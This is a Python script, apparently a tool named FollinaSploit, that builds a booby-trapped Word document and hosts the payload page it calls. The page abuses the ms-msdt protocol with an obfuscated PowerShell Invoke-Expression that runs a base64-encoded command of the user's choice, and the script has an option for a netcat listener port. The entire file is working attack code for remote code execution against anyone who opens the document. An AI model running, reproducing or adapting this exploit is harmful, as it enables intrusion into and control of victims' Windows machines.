
import argparse
import netifaces
import shutil
import socket
import base64
import os
import tempfile
import random
import string
import http.server
import socketserver

parser = argparse.ArgumentParser(description="Follina exploit\n Exemple: FollinaSploit.py -c calc.exe -o poc.docx -p 80")
parser.add_argument("-c","--command", dest="command", default="calc", help="Your command\nDefault: Calc\nExemple : ")
parser.add_argument("-o","--output", dest="output", default="./infected.doc", help="You extension file")
parser.add_argument("-p","--port", dest="port", default=8001, help="The server port with your html payload page")
parser.add_argument("-ncp","--ncport", dest="ncport", default=4444, help="your nc port listener")
parser.add_argument("-i","--interface,", dest="interface", default="eth0", help="Interface ex : eth0, wlan0 etc..")

args = parser.parse_args()

def to64(command):

    fc = base64.b64encode(bytes(command,'utf-8')).decode("utf-8")

    return fc
    
#Specify interface
srvhost = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0]['addr']

#Temporary file 

doc_suffix = "doc"
dir = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
#We put the doc in the temp folder
doc_path = os.path.join(dir, doc_suffix)
srvdir = os.path.join(dir, "www")
os.makedirs(srvdir)
#We copy the doc file in the temp file
shutil.copytree(doc_suffix, os.path.join(dir, doc_path))


#Edit temporary file
document_rels_path = os.path.join(
        dir, doc_suffix, "word", "_rels", "document.xml.rels"
    )

with open(document_rels_path) as f:

    linker = f.read()

    linker = linker.replace("{html_payload}", f"http://{srvhost}:{args.port}/payload.html")
    f.close()

with open(document_rels_path, "w") as f:
    f.write(linker)
    f.close()

b64payload = to64(args.command)
html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{b64payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
html_payload += (
        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
        + "\n</script>"
    )

#We create payload.html 
with open(os.path.join(srvdir, "payload.html"), 'w') as f:
    f.write(html_payload)
    f.close()

#Create doc file
shutil.make_archive(args.output, "zip", doc_path)
os.rename(args.output + ".zip", args.output)

#Run server
class ReuseTCPServer(socketserver.TCPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(self.server_address)

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=srvdir, **kwargs)

def serve_http():
    print(f"Html payload ready on {srvhost}:{args.port}")
    with ReuseTCPServer(("", args.port), Handler) as httpd:
        httpd.serve_forever()

        
serve_http()

